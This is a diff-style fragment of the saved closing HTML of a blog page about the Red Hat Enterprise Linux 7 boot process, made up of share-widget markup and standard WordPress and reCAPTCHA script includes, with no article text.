+<span class="et_social_overlay"></span>
+</a>
+</li></ul>
+<span class="et_social_hide_sidebar et_social_icon"></span>
+</div><div class="et_social_mobile_button"></div>
+<div class="et_social_mobile et_social_fadein">
+<div class="et_social_heading">Share This</div>
+<span class="et_social_close"></span>
+<div class="et_social_networks et_social_simple et_social_rounded et_social_left">
+<ul class="et_social_icons_container"><li class="et_social_facebook">
+<a href="https://www.facebook.com/sharer.php?u=https%3A%2F%2Fwww.yoinsights.com%2Fstep-by-step-red-hat-enterprise-linux-7-booting-process%2F&amp;t=Step%20By%20Step%20Red%20Hat%20Enterprise%20Linux%207%20Booting%20Process" class="et_social_share" rel="nofollow" data-social_name="facebook" data-post_id="4398" data-social_type="share" data-location="sidebar">
+<i class="et_social_icon et_social_icon_facebook"></i>
+<div class="et_social_network_label"><div class="et_social_networkname">Facebook</div></div>
+<span class="et_social_overlay"></span>
+</a>
+</li><li class="et_social_twitter">
+<a href="https://twitter.com/share?text=Step%20By%20Step%20Red%20Hat%20Enterprise%20Linux%207%20Booting%20Process&amp;url=https%3A%2F%2Fwww.yoinsights.com%2Fstep-by-step-red-hat-enterprise-linux-7-booting-process%2F&amp;via=@Yoinsights" class="et_social_share" rel="nofollow" data-social_name="twitter" data-post_id="4398" data-social_type="share" data-location="sidebar">
+<i class="et_social_icon et_social_icon_twitter"></i>
+<div class="et_social_network_label"><div class="et_social_networkname">Twitter</div></div>
+<span class="et_social_overlay"></span>
+</a>
+</li><li class="et_social_googleplus">
+<a href="https://plus.google.com/share?url=https%3A%2F%2Fwww.yoinsights.com%2Fstep-by-step-red-hat-enterprise-linux-7-booting-process%2F&amp;t=Step%20By%20Step%20Red%20Hat%20Enterprise%20Linux%207%20Booting%20Process" class="et_social_share" rel="nofollow" data-social_name="googleplus" data-post_id="4398" data-social_type="share" data-location="sidebar">
+<i class="et_social_icon et_social_icon_googleplus"></i>
+<div class="et_social_network_label"><div class="et_social_networkname">Google+</div></div>
+<span class="et_social_overlay"></span>
+</a>
+</li><li class="et_social_linkedin">
+<a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fwww.yoinsights.com%2Fstep-by-step-red-hat-enterprise-linux-7-booting-process%2F&amp;title=Step%20By%20Step%20Red%20Hat%20Enterprise%20Linux%207%20Booting%20Process" class="et_social_share" rel="nofollow" data-social_name="linkedin" data-post_id="4398" data-social_type="share" data-location="sidebar">
+<i class="et_social_icon et_social_icon_linkedin"></i>
+<div class="et_social_network_label"><div class="et_social_networkname">LinkedIn</div></div>
+<span class="et_social_overlay"></span>
+</a>
+</li><li class="et_social_stumbleupon">
+<a href="http://www.stumbleupon.com/badge?url=https%3A%2F%2Fwww.yoinsights.com%2Fstep-by-step-red-hat-enterprise-linux-7-booting-process%2F&amp;title=Step%20By%20Step%20Red%20Hat%20Enterprise%20Linux%207%20Booting%20Process" class="et_social_share" rel="nofollow" data-social_name="stumbleupon" data-post_id="4398" data-social_type="share" data-location="sidebar">
+<i class="et_social_icon et_social_icon_stumbleupon"></i>
+<div class="et_social_network_label"><div class="et_social_networkname">Stumble</div></div>
+<span class="et_social_overlay"></span>
+</a>
+</li><li class="et_social_pinterest">
+<a href="https://www.yoinsights.com/step-by-step-red-hat-enterprise-linux-7-booting-process/#" class="et_social_share_pinterest" rel="nofollow" data-social_name="pinterest" data-post_id="4398" data-social_type="share" data-location="sidebar">
+<i class="et_social_icon et_social_icon_pinterest"></i>
+<div class="et_social_network_label"><div class="et_social_networkname">Pinterest</div></div>
+<span class="et_social_overlay"></span>
+</a>
+</li><li class="et_social_gmail">
+<a href="https://mail.google.com/mail/u/0/?view=cm&amp;fs=1&amp;su=Step%20By%20Step%20Red%20Hat%20Enterprise%20Linux%207%20Booting%20Process&amp;body=https%3A%2F%2Fwww.yoinsights.com%2Fstep-by-step-red-hat-enterprise-linux-7-booting-process%2F&amp;ui=2&amp;tf=1" class="et_social_share" rel="nofollow" data-social_name="gmail" data-post_id="4398" data-social_type="share" data-location="sidebar">
+<i class="et_social_icon et_social_icon_gmail"></i>
+<div class="et_social_network_label"><div class="et_social_networkname">Gmail</div></div>
+<span class="et_social_overlay"></span>
+</a>
+</li><li class="et_social_like">
+<a href="https://www.yoinsights.com/step-by-step-red-hat-enterprise-linux-7-booting-process/" class="et_social_share" rel="nofollow" data-social_name="like" data-post_id="4398" data-social_type="like" data-location="sidebar">
+<i class="et_social_icon et_social_icon_like"></i>
+<div class="et_social_network_label"><div class="et_social_networkname">Like</div></div>
+<span class="et_social_overlay"></span>
+</a>
+</li><li class="et_social_all_button">
+<a href="https://www.yoinsights.com/step-by-step-red-hat-enterprise-linux-7-booting-process/#" rel="nofollow" data-location="sidebar" data-page_id="4398" data-permalink="https://www.yoinsights.com/step-by-step-red-hat-enterprise-linux-7-booting-process/" data-title="Step By Step Red Hat Enterprise Linux 7 Booting Process" class="et_social_open_all">
+<i class="et_social_icon et_social_icon_all_button"></i>
+<span class="et_social_overlay"></span>
+</a>
+</li></ul>
+</div>
+</div>
+<div class="et_social_mobile_overlay"></div><script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/wp-polyfill.min.js.download" id="wp-polyfill-js"></script>
+<script type="text/javascript" id="wp-polyfill-js-after">
+( 'fetch' in window ) || document.write( '<script src="https://www.yoinsights.com/wp-includes/js/dist/vendor/wp-polyfill-fetch.min.js?ver=3.0.0"></scr' + 'ipt>' );( document.contains ) || document.write( '<script src="https://www.yoinsights.com/wp-includes/js/dist/vendor/wp-polyfill-node-contains.min.js?ver=3.42.0"></scr' + 'ipt>' );( window.DOMRect ) || document.write( '<script src="https://www.yoinsights.com/wp-includes/js/dist/vendor/wp-polyfill-dom-rect.min.js?ver=3.42.0"></scr' + 'ipt>' );( window.URL && window.URL.prototype && window.URLSearchParams ) || document.write( '<script src="https://www.yoinsights.com/wp-includes/js/dist/vendor/wp-polyfill-url.min.js?ver=3.6.4"></scr' + 'ipt>' );( window.FormData && window.FormData.prototype.keys ) || document.write( '<script src="https://www.yoinsights.com/wp-includes/js/dist/vendor/wp-polyfill-formdata.min.js?ver=3.0.12"></scr' + 'ipt>' );( Element.prototype.matches && Element.prototype.closest ) || document.write( '<script src="https://www.yoinsights.com/wp-includes/js/dist/vendor/wp-polyfill-element-closest.min.js?ver=2.0.2"></scr' + 'ipt>' );( 'objectFit' in document.documentElement.style ) || document.write( '<script src="https://www.yoinsights.com/wp-includes/js/dist/vendor/wp-polyfill-object-fit.min.js?ver=2.3.4"></scr' + 'ipt>' );
+( "objectFit" in document.documentElement.style ) || document.write( '<script src="https://www.yoinsights.com/wp-content/plugins/gutenberg/vendor/object-fit-polyfill.min.5f0c4c73.js?ver=2.3.5"></scr' + 'ipt>' );
+</script>
+<script type="text/javascript" id="contact-form-7-js-extra">
+/* <![CDATA[ */
+var wpcf7 = {"api":{"root":"https:\/\/www.yoinsights.com\/wp-json\/","namespace":"contact-form-7\/v1"}};
+/* ]]> */
+</script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/index.js.download" id="contact-form-7-js"></script>
+<script type="text/javascript" id="wpcf7-redirect-script-js-extra">
+/* <![CDATA[ */
+var wpcf7r = {"ajax_url":"https:\/\/www.yoinsights.com\/wp-admin\/admin-ajax.php"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/wpcf7-redirect-frontend-script.js.download" id="wpcf7-redirect-script-js"></script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/idle-timer.min.js.download" id="et_monarch-idle-js"></script>
+<script type="text/javascript" id="et_monarch-custom-js-js-extra">
+/* <![CDATA[ */
+var monarchSettings = {"ajaxurl":"https:\/\/www.yoinsights.com\/wp-admin\/admin-ajax.php","pageurl":"https:\/\/www.yoinsights.com\/step-by-step-red-hat-enterprise-linux-7-booting-process\/","stats_nonce":"e2f59748d5","share_counts":"4e7b613b19","follow_counts":"beeed16eda","total_counts":"36face1d4d","media_single":"b2cb1b44bf","media_total":"800ce7eeec","generate_all_window_nonce":"c1fbc2588f","no_img_message":"No images available for sharing on this page"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/custom.js.download" id="et_monarch-custom-js-js"></script>
+<script type="text/javascript" id="g1_main-js-extra">
+/* <![CDATA[ */
+var g1Theme = {"uri":"https:\/\/www.yoinsights.com\/wp-content\/themes\/3clicks"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/main.js.download" id="g1_main-js"></script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/jquery.touchSwipe.min.js.download" id="jquery.touchSwipe-js"></script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/galleria-1.2.9.min.js.download" id="galleria-js"></script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/galleria.classic.js.download" id="galleria_theme-js"></script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/g1-simple-sliders.js.download" id="g1_simple_sliders-js"></script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/comment-reply.min.js.download" id="comment-reply-js"></script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/jquery.metadata.js.download" id="metadata-js"></script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/jquery.easing.1.3.js.download" id="easing-js"></script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/breakpoints.js.download" id="breakpoints-js"></script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/jquery.carouFredSel-6.2.1-packed.js.download" id="caroufredsel-js"></script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/waypoints.min.js.download" id="jquery.waypoints-js"></script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/skrollr.min.js.download" id="skrollr-js"></script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/jquery.magnific-popup.min.js.download" id="jquery.magnific-popup-js"></script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/modifications.js.download" id="g1_child_main-js"></script>
+<script type="text/javascript" id="griwpc-base-js-extra">
+/* <![CDATA[ */
+var griwpco = {"ajax_url":"https:\/\/www.yoinsights.com\/wp-admin\/admin-ajax.php","standardQueries":"0","formID":"commentform","formQuery":"#respond form","formQueryElem":"0","buttonID":"submit","buttonQuery":"#respond *[type=","buttonQueryElem":"0","recaptcha_elem":null,"recaptcha_id":"griwpc-widget-id","recaptcha_skey":"6Lc9niUTAAAAANUerer6bNZbEy-JVPbv13ujJwRf","recaptcha_theme":"light","recaptcha_size":"normal","recaptcha_type":"image","recaptcha_align":"left","recaptcha_otcm":"0","recaptcha_tag":"p","recaptcha_lang":"","allowCreditMode":"0","home_link_address":"http:\/\/www.joanmiquelviade.com\/plugin\/google-recaptcha-in-wp-comments-form\/","home_link_title":"reCAPTCHA plugin homepage","home_link_text":"Get reCAPTCHA plugin","version":"9.1.2","reCAPTCHAloaded":"1"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/base.js.download" id="griwpc-base-js"></script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/recaptcha.js(1).download" id="google-recaptcha-ini-js"></script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/api.js.download" id="recaptcha-call-js"></script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/common.js.download" id="et-core-common-js"></script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/api.js(1).download" id="google-recaptcha-js"></script>
+<script type="text/javascript" id="wpcf7-recaptcha-js-extra">
+/* <![CDATA[ */
+var wpcf7_recaptcha = {"sitekey":"6LfDWZ8UAAAAANBI26AZwYTddrjRNSuaf6BD3lMx","actions":{"homepage":"homepage","contactform":"contactform"}};
+/* ]]> */
+</script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/index.js(1).download" id="wpcf7-recaptcha-js"></script>
+<script type="text/javascript" src="./Step By Step  Linux 7 Booting Process_files/wp-embed.min.js.download" id="wp-embed-js"></script>
+
+<div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><iframe title="reCAPTCHA" src="./Step By Step  Linux 7 Booting Process_files/anchor.html" width="256" height="60" role="presentation" name="a-qija83e1c9o2" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox"></iframe></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;" src="./Step By Step  Linux 7 Booting Process_files/saved_resource(1).html"></iframe></div></body></html>
